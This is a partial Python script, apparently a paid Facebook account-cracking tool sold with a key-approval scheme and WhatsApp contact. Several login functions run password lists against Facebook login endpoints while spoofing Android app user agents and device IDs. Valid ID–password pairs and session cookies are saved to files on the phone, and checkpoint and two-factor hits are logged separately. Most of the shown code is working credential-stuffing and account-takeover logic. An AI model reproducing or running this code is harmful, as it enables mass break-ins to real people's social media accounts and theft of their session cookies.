...
os.system('xdg-open https://chat.whatsapp.com/BM4OU0IQ7HkL3lvWVA7znV')
try:
...
..::::..:::......::::..:::::..:: 
\x1b[1;97m --------------------------------------------- 
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Author      : Ngr Afghan
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m GitHub      : not available 
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook    : ngrafghan170
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Telegram    : @ngrafghan310
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m version     : 0.5
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Tool Type   : PAID
\033[1;97m--------------------------------------------------"""
def linex():
	print('\033[1;97m--------------------------------------------------')
def clear():
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [NGR-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [NGR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/NGR-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/NGR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[NGR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [NGR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/NGR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/NGR-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NGR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=2.5,width=720,height=1280};FBLC/en_BD;FBCR/null;FBMF/Samsung;FBBD/Galaxy Note 9;FBPN/com.facebook.orca;FBDV/SM-N960F/10;FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/NGR-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/NGR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NGR-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api4(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [NGR-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def Hamza1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [NGR] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
    ...
    # 'cookie': 'datr=0SmXaKcJDgAfmuOMdohcbFOi; sb=0SmXaCeOVAp56-OFHhxP4CjB; m_pixel_ratio=3; wd=420x910; fr=0UNZkU5bu7IwMgvis..BolynR..AAA.0.0.Bolyn0.AWe1fyxcEHmVfSpqwPPZRUEPcDg',
    'dpr': '3',
	...
	for pas in passlist:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m [NGR-OK] '+uid+' | '+pas+'\033[1;37m')
				oks.append(uid)
				open('/sdcard/NGR-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
				...
				try:
					...
					ids = ids
				open('/sdcard/NGR-R-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:continue
		except (requests.exceptions.ConnectionError):
...
def Subscraption():
	...
	clear()
#	print(logo)
	r1=requests.get("https://github.com/NGR331/NGR/blob/main/NGR_Approve.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		menu()
		...
		print(logo)
		print ("")
		print(" \033[1;32m NGR Tool Paid You Need Get Approved First\033[1;37m\n")
		print ("")
		...
		os.system('am start https://wa.me/+93707156310?text=' + tks)
		Subscraption()        
Subscraption()